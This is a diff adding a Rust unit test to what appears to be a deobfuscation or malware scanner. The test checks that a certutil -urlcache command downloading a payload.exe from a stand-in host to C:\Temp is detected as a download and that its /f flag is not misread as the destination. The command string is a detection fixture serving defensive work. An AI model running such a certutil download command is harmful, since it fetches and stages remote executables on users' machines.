@@ -14170,6 +14170,27 @@ $v = 'fTp:\\var-liberal.example\stage.dat'"#,
             env.traits
         );
     }
+
+    #[test]
+    fn certutil_urlcache_slash_flag_after_url_in_deob_text_is_not_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Temp\cr.tmp -urlcache https://cert-deob.example/payload.exe /f C:\Temp\payload.exe"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::CertutilDownload { url, dst }
+                    if url == "https://cert-deob.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "certutil deob-text slash flag was parsed as destination: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
